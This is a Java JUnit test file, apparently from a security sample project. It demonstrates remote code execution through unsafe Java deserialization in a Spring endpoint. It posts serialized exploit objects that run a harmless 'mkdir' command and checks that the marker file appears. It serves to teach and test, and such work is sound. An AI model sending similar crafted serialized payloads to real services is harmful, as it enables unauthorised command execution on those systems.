package com.ttulka.security.sample.spring;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import com.ttulka.security.Exploit;
import com.ttulka.security.sample.Vulnerable;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.web.server.LocalServerPort;

import static com.ttulka.security.SerializationUtils.serialize;
import static com.ttulka.security.sample.spring.Application.SERVICE_PATH;
import static io.restassured.RestAssured.given;
import static java.util.concurrent.TimeUnit.SECONDS;
import static org.awaitility.Awaitility.await;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class RemoteInvocationTest {

    @Test
    void remote_invocation_is_hacked(@LocalServerPort int port, @TempDir Path tempDir) throws Exception {
        Path exploitFile = tempDir.resolve("exploit.ser" + RemoteInvocationTest.class.getSimpleName());
        Path hackedFile = tempDir.resolve("_YOU_HAVE_BEEN_HACKED_" + RemoteInvocationTest.class.getSimpleName());

        createExploit(exploitFile, hackedFile);

        given()
            .port(port)
            .contentType("application/x-java-serialized-object")
            .body(Files.newInputStream(exploitFile)).
        when()
            .post(SERVICE_PATH).
        then()
            .statusCode(500);

        await().atMost(2, SECONDS)
                .until(() -> Files.exists(hackedFile));
    }

    /** uses external exploit, not included on the classpath of the application */
    @Test
    void external_exploit_is_executed_on_server(@LocalServerPort int port) throws Exception {
        given()
            .port(port)
            .contentType("application/x-java-serialized-object")
            .body(this.getClass().getResourceAsStream("/exploit.ser")). // generated by ExploitExternal.main()
        when()
            .post(SERVICE_PATH).
        then()
            .statusCode(500);

        await().atMost(2, SECONDS)
                .until(() -> Files.exists(Paths.get("_HACKED_")));

        Files.delete(Paths.get("_HACKED_"));
    }

    private void createExploit(Path exploitFile, Path hackedFile) throws Exception {
        Vulnerable vulnerable = new Vulnerable();
        vulnerable.setObject(new Object());
        vulnerable.setProperty("myprop");

        Vulnerable exploited = new Exploit("mkdir " + hackedFile.toAbsolutePath())
                .exploited(vulnerable);

        serialize(vulnerable, exploitFile);
    }
}
